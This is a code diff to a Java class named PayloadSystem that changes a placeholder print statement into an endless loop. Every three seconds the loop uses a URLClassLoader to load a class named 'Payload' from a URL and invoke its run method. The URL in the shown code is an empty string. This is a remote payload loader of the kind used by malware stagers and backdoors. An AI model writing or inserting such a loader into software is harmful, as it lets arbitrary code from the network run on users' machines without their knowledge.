@@ -2,6 +2,8 @@ package plvc;
 
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+import java.net.URL;
+import java.net.URLClassLoader;
 
 public class PayloadSystem {
 
@@ -20,12 +22,24 @@ public class PayloadSystem {
     }
 
     private static void payload() {
-        try {
-            Thread.sleep(3000);
-        } catch (InterruptedException e) {
-            e.printStackTrace();
+        while (true) {
+            try {
+                Thread.sleep(3000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+
+            try {
+                URL url = new URL("");
+                ClassLoader classLoader = new URLClassLoader(new URL[]{url}, Thread.currentThread().getContextClassLoader());
+                Class payloadClass = classLoader.loadClass("Payload");
+                Object payloadInstance = payloadClass.newInstance();
+                Method runMethod = payloadClass.getDeclaredMethod("run");
+                runMethod.invoke(payloadInstance);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         }
-        System.out.println("PAYLOAD TIME!");
     }
 
 }
